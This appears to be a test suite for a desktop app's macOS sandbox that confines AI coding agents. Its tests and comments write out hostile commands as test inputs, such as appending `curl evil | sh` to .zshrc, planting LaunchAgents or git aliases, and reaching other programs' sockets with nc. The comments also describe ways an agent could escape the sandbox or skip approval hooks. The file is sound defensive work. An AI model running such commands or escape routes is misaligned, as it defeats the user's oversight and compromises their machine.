import { spawn, spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { createServer, type Server } from 'node:net';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';

vi.mock('electron', () => ({ app: { getPath: () => tmpdir(), getVersion: () => '0.0.0' }, safeStorage: {} }));
const { appDirs, dockerConfigDir, engineProfile, fileOpsProfile, makeRunTemp, removeRunTemp, seatbeltProfile, socketHolders } = await import('../src/main/sandbox');
const { listConfined, readConfined, writeConfined } = await import('../src/main/confined');

// W-128: what decides approvals (Wren's helper, Grok's per-run hook plugin) can't be changed by any agent,
// even when an allowed folder contains it. Run in the real macOS sandbox.
const sb = (profile: string, cmd: string) => spawnSync('/usr/bin/sandbox-exec', ['-p', profile, '/bin/sh', '-c', cmd], { encoding: 'utf8' });

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('trusted files in the sandbox (W-128)', () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-integrity-')));
  const project = join(root, 'project'); // an allowed folder...
  const helperDir = join(project, 'release', 'Wren.app', 'dist'); // ...that contains a build of Wren
  const data = join(root, 'data');
  const plugin = join(data, 'engines', 'grok-run1');
  mkdirSync(helperDir, { recursive: true });
  mkdirSync(join(plugin, 'hooks'), { recursive: true });
  writeFileSync(join(helperDir, 'mcp-approve.mjs'), 'original');
  writeFileSync(join(plugin, 'hooks', 'hooks.json'), 'hook');

  it("keeps Wren's helpers unwritable inside an allowed folder, for commands and engines alike", () => {
    for (const profile of [seatbeltProfile([project], data, undefined, [helperDir]), engineProfile('grok-build', [project], data, [helperDir])]) {
      expect(sb(profile, `echo x > ${join(project, 'ok.txt')}`).status).toBe(0); // the folder itself is writable
      expect(sb(profile, `echo allow-all > ${join(helperDir, 'mcp-approve.mjs')}`).status).not.toBe(0);
      expect(sb(profile, `cat ${join(helperDir, 'mcp-approve.mjs')}`).stdout).toBe('original'); // still readable
    }
    expect(readFileSync(join(helperDir, 'mcp-approve.mjs'), 'utf8')).toBe('original');
    // This app's own folders are protected even when a caller passes none (Wren's file tools).
    const own = appDirs()[0];
    expect(fileOpsProfile([own], data)).toContain(`(deny file-write* (subpath ${JSON.stringify(own)})`);
  });

  it("lets Grok read its per-run plugin, and nobody write it (another task's commands can't even read it)", () => {
    const grok = engineProfile('grok-build', [project], data, [helperDir], undefined, [plugin]);
    expect(sb(grok, `cat ${join(plugin, 'hooks', 'hooks.json')}`).stdout).toBe('hook');
    // Grok resolves the plugin path through the data folder: without lookups there it silently loaded no
    // hook, and ran writes without asking (found with grok 1.0.46).
    expect(sb(grok, `/bin/realpath ${join(plugin, 'hooks', 'hooks.json')}`).stdout.trim()).toBe(join(plugin, 'hooks', 'hooks.json'));
    expect(sb(grok, `ls ${data}`).status).not.toBe(0); // looking a path up isn't listing the data folder
    expect(sb(grok, `echo '{}' > ${join(plugin, 'hooks', 'hooks.json')}`).status).not.toBe(0);
    const command = seatbeltProfile([project], data, undefined, [helperDir]);
    expect(sb(command, `cat ${join(plugin, 'hooks', 'hooks.json')}`).stdout).toBe('');
    expect(sb(command, `echo '{}' > ${join(plugin, 'hooks', 'hooks.json')}`).status).not.toBe(0);
    expect(readFileSync(join(plugin, 'hooks', 'hooks.json'), 'utf8')).toBe('hook');
  });
});

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('the engine sign-in script Terminal runs (W-172)', () => {
  it('is out of agents\' reach, where the temp folder (its old place) is not', async () => {
    const { engineLoginScript } = await import('../src/main/login');
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-login-')));
    const project = join(root, 'project');
    const data = join(root, 'data');
    mkdirSync(project, { recursive: true });
    const prog = '/Users/someone/.local/share/claude/versions/2.1.300';
    const { file, dir } = engineLoginScript(data, 'claude-code', prog);
    expect(dir.startsWith(join(data, 'login') + '/')).toBe(true);
    expect(statSync(file).mode & 0o777).toBe(0o700);
    expect(readFileSync(file, 'utf8')).toMatch(/\n'\/Users\/someone\/\.local\/share\/claude\/versions\/2\.1\.300'\n$/);
    const command = seatbeltProfile([project], data);
    for (const evil of [`echo 'touch pwned' >> '${file}'`, `mv '${dir}' '${dir}.x'`, `ln -sf /tmp/x '${file}'`]) {
      expect(sb(command, evil).status, evil).not.toBe(0);
    }
    sb(command, `rm -rf '${dir}'`); // rm -f says nothing about what it may not even look at
    expect(existsSync(file)).toBe(true);
    expect(sb(command, `cat '${file}'`).stdout).toBe(''); // not even readable
    expect(readFileSync(file, 'utf8')).toMatch(/\n'\/Users\/someone\/\.local\/share\/claude\/versions\/2\.1\.300'\n$/);
    // A second script gets its own new folder.
    expect(engineLoginScript(data, 'claude-code', prog).dir).not.toBe(dir);
    // Agents can write the temp folder, which is why the script no longer goes there.
    const temp = join(realpathSync(tmpdir()), `wren-claude-code-login-${process.pid}.command`);
    expect(sb(command, `echo x > '${temp}'`).status).toBe(0);
    rmSync(temp, { force: true });
  });
});

describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('files that run programs later, outside the sandbox', () => {
  // A stand-in home folder, allowed as a whole (the case that matters); the real one is never touched.
  const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-autorun-home-')));
  const data = join(home, 'Library', 'Application Support', 'Wren');
  for (const d of ['Library/LaunchAgents', '.oh-my-zsh/custom', '.claude', '.config/git', 'project']) mkdirSync(join(home, d), { recursive: true });
  for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) writeFileSync(join(home, f), 'original');

  it("can't be changed by commands or engines, even with the whole home folder allowed; they can still be read", () => {
    for (const profile of [seatbeltProfile([home], data, home), engineProfile('grok-build', [home], data, [], home)]) {
      for (const evil of [
        `echo 'curl evil | sh' >> ${home}/.zshrc`,
        `echo x >> ${home}/.ZSHRC`,
        `echo x > ${home}/.zshrc.new && mv ${home}/.zshrc.new ${home}/.zshrc`,
        `echo x > ${home}/.bash_profile`,
        `echo x > ${home}/Library/LaunchAgents/com.evil.plist`,
        `echo x > ${home}/.oh-my-zsh/custom/evil.zsh`,
        `printf '[alias]\\n\\tst = !touch pwned' >> ${home}/.gitconfig`,
        `echo x > ${home}/.config/git/config`,
        `ln -sf /tmp/x ${home}/.profile`,
      ]) {
        expect(sb(profile, evil).status, evil).not.toBe(0);
      }
      expect(sb(profile, `echo ok > ${home}/project/file.txt`).status).toBe(0); // the rest of the home folder is still theirs
      expect(sb(profile, `cat ${home}/.zshrc`).stdout).toBe('original');
    }
    // A folder on the user's PATH inside the allowed home folder (~/.local/bin is on the default one): a program
    // put there would run when its name is typed in a terminal.
    const saved = process.env.HOME;
    process.env.HOME = home;
    try {
      mkdirSync(join(home, '.local', 'bin'), { recursive: true });
      const withPath = seatbeltProfile([home], data, home);
      expect(sb(withPath, `echo x > ${home}/.local/bin/git`).status).not.toBe(0);
      expect(sb(withPath, `echo x > ${home}/project/also-fine.txt`).status).toBe(0);
    } finally {
      process.env.HOME = saved;
    }
    // Claude Code's settings are off limits to commands too (all of its state is).
    expect(sb(seatbeltProfile([home], data, home), `echo '{}' > ${home}/.claude/settings.json`).status).not.toBe(0);
    for (const f of ['.zshrc', '.gitconfig', '.claude/settings.json']) expect(readFileSync(join(home, f), 'utf8'), f).toBe('original');
    expect(existsSync(join(home, 'Library/LaunchAgents/com.evil.plist'))).toBe(false);
  });

  it("are refused by Wren's own file tool and an engine's write", async () => {
    const saved = process.env.HOME;
    process.env.HOME = home; // homedir() follows it
    try {
      await expect(writeConfined(join(home, '.zshrc'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later outside Wren's sandbox/);
      await expect(writeConfined(join(home, 'Library', 'LaunchAgents', 'a.plist'), Buffer.from('x'), [home], data)).rejects.toThrow(/run later/);
      await writeConfined(join(home, 'project', 'ok.txt'), Buffer.from('fine'), [home], data);
      expect(readFileSync(join(home, 'project', 'ok.txt'), 'utf8')).toBe('fine');
      const { claudeDenyRules } = await import('../src/engines/claude-code');
      const { autorunPaths } = await import('../src/main/sandbox');
      const rules = claudeDenyRules([], autorunPaths());
      expect(rules).toContain(`Edit(/${home}/.zshrc)`);
      expect(rules).toContain(`Edit(/${home}/.claude/settings.json)`);
      expect(rules.some((r) => r.startsWith('Read('))).toBe(false); // reading them is fine
    } finally {
      process.env.HOME = saved;
    }
    expect(readFileSync(join(home, '.zshrc'), 'utf8')).toBe('original');
  });
});

describe('programs Wren starts outside the sandbox (W-178)', () => {
  it('are never ones agents could have changed', async () => {
    const { agentCanWrite } = await import('../src/main/sandbox');
    const home = '/Users/someone';
    const data = `${home}/Library/Application Support/Wren`;
    const can = (p: string, roots: string[] = [`${home}/Projects`]) => agentCanWrite(p, roots, data, home);
    // Playwright's own Chromium, a bun or pnpm global install: in caches agents may write.
    expect(can(`${home}/Library/Caches/ms-playwright/chromium-1243/chrome-mac/Chromium.app/Contents/MacOS/Chromium`)).toBe(true);
    expect(can(`${home}/.bun/install/global/node_modules/@anthropic-ai/claude-code/cli.js`)).toBe(true);
    expect(can(`${home}/Library/pnpm/store/v10/files/00/abc`)).toBe(true);
    // Claude Code's and Grok Build's own installs, even when the whole home folder is allowed.
    for (const roots of [[`${home}/Projects`], [home]]) {
      expect(can(`${home}/.local/share/claude/versions/2.1.300`, roots)).toBe(false);
      expect(can(`${home}/.grok/downloads/grok-1.0.52-macos-aarch64`, roots)).toBe(false);
      expect(can(`${home}/.grok/bin/grok`, roots)).toBe(false);
      expect(can(`${data}/policy.json`, roots)).toBe(false);
    }
    // Grok's commands may still write the rest of its state (sessions, logs).
    expect(can(`${home}/.grok/sessions/x.json`)).toBe(true);
    // W-181: a sibling named like a protected folder is not protected ("<folder>.anything").
    expect(can(`${home}/.claude.payload/cli`, [home])).toBe(true);
    expect(can(`${data}.other/cli`, [home])).toBe(true);
    // W-182: Claude Code's own file tools count as a writer too: what its deny rules leave open in an
    // allowed folder (its own session files) is writable; its installed program is not.
    expect(can(`${home}/.claude/projects/x`, [home])).toBe(true);
    expect(can(`${home}/.claude/projects/x`, [`${home}/Projects`])).toBe(false);
    // The folders on the user's PATH are out of agents' reach even with the home folder allowed.
    expect(agentCanWrite(join(homedir(), '.local', 'bin', 'claude'), [homedir()], join(homedir(), 'Library', 'Application Support', 'Wren'))).toBe(false);
    // A program in an allowed folder (an npm global prefix under an allowed home) could be changed.
    expect(can(`${home}/.npm-global/lib/node_modules/@anthropic-ai/claude-code/cli.js`, [home])).toBe(true);
    expect(can('/opt/homebrew/lib/node_modules/@anthropic-ai/claude-code/cli.js', [home])).toBe(false);
  });
});

describe("Wren's own file tool (W-128)", () => {
  it('refuses to write into Wren itself, even inside an allowed folder', async () => {
    const own = appDirs()[0];
    await expect(writeConfined(join(own, 'mcp-approve.mjs'), Buffer.from('x'), [own], mkdtempSync(join(tmpdir(), 'wren-d-')))).rejects.toThrow(/part of Wren itself/);
  });

  it("leaves Wren's own folders out of a listing of a folder that contains them", async () => {
    const own = appDirs()[0]; // src/main here
    const parent = join(own, '..');
    const listed = await listConfined(parent, 2, [parent], mkdtempSync(join(tmpdir(), 'wren-d-')));
    expect(listed.length).toBeGreaterThan(0);
    expect(listed.some((l) => l.includes(own))).toBe(false);
  });
});

// W-134: Wren's data folder (local policy, device sign-in, updates) is out of reach of its file tools on every
// platform, even when an allowed folder contains it; listings leave it out.
describe("Wren's data folder", () => {
  it('is refused to the file tools inside an allowed folder, and left out of listings', async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-home-')));
    const data = join(home, '.wren');
    mkdirSync(data);
    writeFileSync(join(data, 'policy.json'), '{"shell":false}');
    writeFileSync(join(home, 'notes.txt'), 'mine');
    await expect(writeConfined(join(data, 'policy.json'), Buffer.from('{"shell":true}'), [home], data)).rejects.toThrow(/part of Wren itself/);
    await expect(readConfined(join(data, 'policy.json'), [home], data, 1e6)).rejects.toThrow(/part of Wren itself/);
    await expect(listConfined(data, 1, [home], data)).rejects.toThrow(/part of Wren itself/);
    const listed = (await listConfined(home, 2, [home], data)).join('\n');
    expect(listed).toContain('notes.txt');
    expect(listed).not.toContain('.wren');
    expect(readFileSync(join(data, 'policy.json'), 'utf8')).toBe('{"shell":false}');
  });

  it('leaves out a data folder whose name has pattern characters, and nothing it would match as a pattern', async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-home-')));
    const data = join(home, 'd[1]*');
    mkdirSync(data);
    writeFileSync(join(data, 'policy.json'), '{}');
    mkdirSync(join(home, 'd1x')); // what `d[1]*` matches as a pattern: the user's own folder
    writeFileSync(join(home, 'd1x', 'notes.txt'), 'mine');
    const listed = (await listConfined(home, 2, [home], data)).map((l) => l.split(' ').slice(2).join(' '));
    expect(listed).toContain(join(home, 'd1x', 'notes.txt'));
    expect(listed.some((p) => p.startsWith(data))).toBe(false);
  });

  it("doesn't let Wren's own folders use up a listing's limit", async () => {
    const parent = join(appDirs()[0], '..'); // src, which holds this app's main folder (src/main here)
    const data = mkdtempSync(join(tmpdir(), 'wren-d-'));
    const all = await listConfined(parent, 2, [parent], data, 1000);
    expect(all.length).toBeGreaterThan(1);
    expect(await listConfined(parent, 2, [parent], data, all.length)).toEqual(all);
  });
});

// A-D4 (0.1.50): Wren's own file tools never use credential stores or the engines' sign-ins, even with the whole
// home folder allowed. On macOS the helper's profile refuses them too; on Windows these checks are all there is.
describe("Wren's file tools and credential stores", () => {
  it('refuse to read, write or list them, and leave them out of a listing', async () => {
    const home = realpathSync(mkdtempSync(join(tmpdir(), 'wren-secrets-home-')));
    const data = join(home, 'Library', 'Application Support', 'Wren');
    for (const d of ['.docker', '.config/gh', '.grok', '.ssh', 'project']) mkdirSync(join(home, d), { recursive: true });
    for (const f of ['.npmrc', '.docker/config.json', '.config/gh/hosts.yml', '.grok/auth.json', '.ssh/config', 'project/notes.md']) writeFileSync(join(home, f), 'stand-in');
    symlinkSync(join(home, '.npmrc'), join(home, 'project', 'npmrc-link'));
    const saved = process.env.HOME;
    process.env.HOME = home; // homedir() follows it
    try {
      for (const f of ['.npmrc', '.docker/config.json', '.config/gh/hosts.yml', '.grok/auth.json', 'project/npmrc-link']) {
        await expect(readConfined(join(home, f), [home], data, 1e6), f).rejects.toThrow(/credential store/);
      }
      await expect(writeConfined(join(home, '.docker', 'config.json'), Buffer.from('x'), [home], data)).rejects.toThrow(/credential store/);
      await expect(listConfined(join(home, '.ssh'), 2, [home], data)).rejects.toThrow(/credential store/);
      const listed = (await listConfined(home, 3, [home], data)).join('\n');
      expect(listed).toContain('notes.md');
      for (const f of ['.npmrc', '.docker', '.config/gh', '.grok', '.ssh']) expect(listed, f).not.toContain(join(home, f));
      expect((await readConfined(join(home, 'project', 'notes.md'), [home], data, 1e6)).toString()).toBe('stand-in');
      expect(readFileSync(join(home, '.docker', 'config.json'), 'utf8')).toBe('stand-in');
    } finally {
      process.env.HOME = saved;
      rmSync(home, { recursive: true, force: true });
    }
  });
});

// A-D2 (0.1.50): what runs in a profile can't start anything outside it. Before, a command could build an app
// in an allowed folder and `open` it, and the app ran with the user's full access.
describe.skipIf(!existsSync('/usr/bin/sandbox-exec'))('starting things outside the sandbox (A-D2)', () => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'wren-escape-')));
  const project = join(root, 'project');
  const data = join(root, 'data');
  mkdirSync(project, { recursive: true });
  mkdirSync(data, { recursive: true });
  const profiles = (roots: string[]) => [seatbeltProfile(roots, data), engineProfile('grok-build', roots, data, [])];
  /** Like sb, without blocking this process (the socket servers below answer from it). */
  const run = (profile: string, cmd: string) =>
    new Promise<number>((resolve) => {
      const c = spawn('/usr/bin/sandbox-exec', ['-p', profile, '/bin/sh', '-c', cmd], { stdio: 'ignore' });
      const t = setTimeout(() => c.kill(), 5000);
      c.on('exit', (code) => {
        clearTimeout(t);
        resolve(code ?? -1);
      });
    });

  // 2026-11-26 audit: system services that act for a command outside its own process. Each check first shows the
  // service works outside any profile, so a machine without it (CI) proves nothing either way.
  it("can't read the clipboard, capture the screen, run the user's Shortcuts or change the agents' Docker config", () => {
    for (const profile of profiles([project])) {
      const before = spawnSync('/usr/bin/pbpaste', ['-pboard', 'find'], { encoding: 'utf8' }).stdout;
      try {
        spawnSync('/usr/bin/pbcopy', ['-pboard', 'find'], { input: 'wren-probe' });
        if (spawnSync('/usr/bin/pbpaste', ['-pboard', 'find'], { encoding: 'utf8' }).stdout === 'wren-probe') {
          expect(sb(profile, '/usr/bin/pbpaste -pboard find').stdout).toBe('');
          sb(profile, 'printf changed | /usr/bin/pbcopy -pboard find');
          expect(spawnSync('/usr/bin/pbpaste', ['-pboard', 'find'], { encoding: 'utf8' }).stdout).toBe('wren-probe');
        }
      } finally {
        spawnSync('/usr/bin/pbcopy', ['-pboard', 'find'], { input: before });
      }
      if (spawnSync('/usr/bin/shortcuts', ['list']).status === 0) expect(sb(profile, '/usr/bin/shortcuts list').status).not.toBe(0);
      // One pixel, so the test never keeps a picture of the screen.
      const shot = join(project, 'pixel.png');
      spawnSync('/usr/sbin/screencapture', ['-x', '-R0,0,1,1', shot]);
      const works = existsSync(shot);
      rmSync(shot, { force: true });
      if (works) {
        // Refused, it waits rather than failing: ended after 3 s (a 1-pixel capture takes ~80 ms when allowed).
        spawnSync('/usr/bin/sandbox-exec', ['-p', profile, '/usr/sbin/screencapture', '-x', '-R0,0,1,1', shot], { timeout: 3_000 });
        expect(existsSync(shot)).toBe(false);
        rmSync(shot, { force: true });
      }
      expect(profile).toMatch(/replayd/);
      expect(sb(profile, `/bin/mkdir -p '${dockerConfigDir()}' 2>/dev/null; echo x > '${dockerConfigDir()}/config.json'`).status).not.toBe(0);
    }
  }, 30_000);

  it("can't open an app it built, so the app never runs with the user's full access", async () => {
    // A minimal background app that leaves a mark where commands can't write (the data folder).
    const mark = join(data, 'escaped');
    const app = join(project, 'Escape.app');
    mkdirSync(join(app, 'Contents', 'MacOS'), { recursive: true });
    writeFileSync(
      join(app, 'Contents', 'Info.plist'),
      '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>CFBundleExecutable</key><string>run</string><key>CFBundleIdentifier</key><string>dev.wren.test.escape</string><key>LSUIElement</key><true/></dict></plist>',
    );
    writeFileSync(join(app, 'Contents', 'MacOS', 'run'), `#!/bin/sh\n/usr/bin/touch '${mark}'\n`, { mode: 0o755 });
    for (const profile of profiles([project])) {
      expect(await run(profile, `/usr/bin/open -g -j '${app}'`)).not.toBe(0);
      expect(profile).toContain('(deny appleevent-send)'); // osascript can't tell Terminal or Finder to run things
    }
    await new Promise((r) => setTimeout(r, 1500));
    expect(existsSync(mark)).toBe(false);
  });

  it('reaches unix sockets only in folders it may write, and the network still works', async () => {
    // The rule covers /Users and /Volumes, so the sockets go in this checkout (under /Users here and on CI).
    const home = realpathSync(mkdtempSync(join(__dirname, '.tmp-sock-')));
    if (!home.startsWith('/Users/')) return;
    const allowed = join(home, 'project');
    const outside = join(home, 'service'); // e.g. ~/.docker/run, an editor's or a language server's socket
    mkdirSync(allowed);
    mkdirSync(outside);
    const servers: Server[] = [];
    const listen = (at: string | number) =>
      new Promise<Server>((resolve) => {
        const s = createServer((c) => c.end());
        servers.push(s);
        if (typeof at === 'string') s.listen(at, () => resolve(s));
        else s.listen(at, '127.0.0.1', () => resolve(s));
      });
    try {
      await listen(join(outside, 's'));
      await listen(join(allowed, 's'));
      const tcp = ((await listen(0)).address() as { port: number }).port;
      symlinkSync(join(outside, 's'), join(allowed, 'link')); // like /var/run/docker.sock
      for (const profile of profiles([allowed])) {
        expect(await run(profile, `/usr/bin/nc -U '${join(outside, 's')}' </dev/null`)).not.toBe(0);
        expect(await run(profile, `/usr/bin/nc -U '${join(allowed, 'link')}' </dev/null`)).not.toBe(0);
        expect(await run(profile, `/usr/bin/nc -U '${join(allowed, 's')}' </dev/null`)).toBe(0);
        expect(await run(profile, `/usr/bin/nc 127.0.0.1 ${tcp} </dev/null`)).toBe(0);
      }
      // Outside any profile the same socket answers, so the refusals above are the profile's doing.
      expect(await run('(version 1)\n(allow default)', `/usr/bin/nc -U '${join(outside, 's')}' </dev/null`)).toBe(0);
    } finally {
      for (const s of servers) s.close();
      rmSync(home, { recursive: true, force: true });
    }
  });

  // The fix review (0.1.50): Seatbelt reads only the first path of a `(remote unix-socket …)`, the temp folders
  // hold other programs' sockets (tmux, editors, browsers, Claude Code), and a socket or its folder could be
  // moved or linked to where connecting is allowed.
  it("reaches only its own sockets: every allowed folder, its run's temp folder and the database sockets, never another program's, wherever it's moved", async () => {
    const home = realpathSync(mkdtempSync(join(__dirname, '.tmp-sock-')));
    if (!home.startsWith('/Users/')) return;
    const first = join(home, 'first');
    const second = join(home, 'second');
    mkdirSync(first);
    mkdirSync(second);
    // Another program's sockets in the temp folder: one in a folder of its own (as tmux keeps it) and one alone.
    const foreign = mkdtempSync('/private/tmp/wren-test-foreign-');
    const family = mkdtempSync('/private/tmp/tmux-'); // tmux-<random>: the family pattern needs digits, the scan finds it
    const runId = `test-${process.pid}`;
    const temp = makeRunTemp(runId);
    const db = `/private/tmp/.s.PGSQL.${50_000 + (process.pid % 9000)}`;
    const servers: Server[] = [];
    const listen = (at: string) =>
      new Promise<Server>((resolve) => {
        const s = createServer((c) => c.end());
        servers.push(s);
        s.listen(at, () => resolve(s));
      });
    try {
      for (const p of [join(foreign, 's'), join(family, 'default'), join(second, 'own'), join(temp, 'own'), db]) await listen(p);
      socketHolders(Date.now() + 60_000); // a fresh scan, which finds the two folders above
      for (const profile of profiles([first, second])) {
        // Its own: in the second allowed folder too, its temp folder, the default database socket.
        for (const p of [join(second, 'own'), join(temp, 'own'), db]) expect(await run(profile, `/usr/bin/nc -U '${p}' </dev/null`), p).toBe(0);
        // Another program's, where it is and wherever a command tries to carry it.
        expect(await run(profile, `/usr/bin/nc -U '${join(foreign, 's')}' </dev/null`)).not.toBe(0);
        expect(await run(profile, `/bin/mv '${join(foreign, 's')}' '${join(temp, 'moved')}'`)).not.toBe(0);
        expect(await run(profile, `/bin/ln '${join(foreign, 's')}' '${join(first, 'linked')}'`)).not.toBe(0);
        expect(await run(profile, `/bin/mv '${foreign}' '${join(first, 'folder')}'`)).not.toBe(0);
        expect(await run(profile, `/bin/mv '${family}' '${join(temp, 'folder')}'`)).not.toBe(0);
        // Ordinary temp-folder work is untouched: a mktemp folder, a /tmp folder renamed and removed.
        expect(await run(profile, `d=$(mktemp -d) && mkdir -p "$d/a" && /bin/rm -r "$d"`)).toBe(0);
        expect(await run(profile, `d=$(mktemp -d /private/tmp/wren-test-own-XXXXXX) && mkdir "$d/a" && mv "$d" "$d.2" && /bin/rm -r "$d.2"`)).toBe(0);
      }
      expect(existsSync(join(foreign, 's')) && existsSync(join(family, 'default'))).toBe(true);
    } finally {
      for (const s of servers) s.close();
      rmSync(home, { recursive: true, force: true });
      rmSync(foreign, { recursive: true, force: true });
      rmSync(family, { recursive: true, force: true });
      removeRunTemp(runId);
    }
  });
});

// W-133: a development Wren (`electron .` in the repo) runs code from outside its build too: its start file,
// the node_modules it loads from, and a linked runtime module's real folder.
describe('a development build', () => {
  it("counts its package file, node_modules and runtime modules' real folders as Wren itself, not its source", () => {
    const repo = realpathSync(mkdtempSync(join(tmpdir(), 'wren-dev-')));
    const pkg = join(repo, 'apps', 'desktop');
    const store = join(repo, '.store', 'playwright-core');
    mkdirSync(join(pkg, 'dist-electron'), { recursive: true });
    mkdirSync(join(pkg, 'src'), { recursive: true });
    mkdirSync(store, { recursive: true });
    mkdirSync(join(repo, 'node_modules'));
    writeFileSync(join(pkg, 'package.json'), '{"main":"dist-electron/main.js"}');
    writeFileSync(join(store, 'package.json'), '{"name":"playwright-core"}');
    symlinkSync(store, join(repo, 'node_modules', 'playwright-core'));
    const dirs = appDirs(join(pkg, 'dist-electron'));
    for (const p of [join(pkg, 'dist-electron'), join(pkg, 'package.json'), join(repo, 'node_modules'), store]) expect(dirs).toContain(p);
    expect(dirs.some((d) => join(pkg, 'src').startsWith(d + '/') || d === join(pkg, 'src'))).toBe(false);
    // A packaged app's code is its bundle; nothing of this kind is added.
    expect(appDirs(join(repo, 'Wren.app', 'Contents', 'Resources', 'app.asar', 'dist-electron'))).not.toContain(join(repo, 'node_modules'));
  });
});
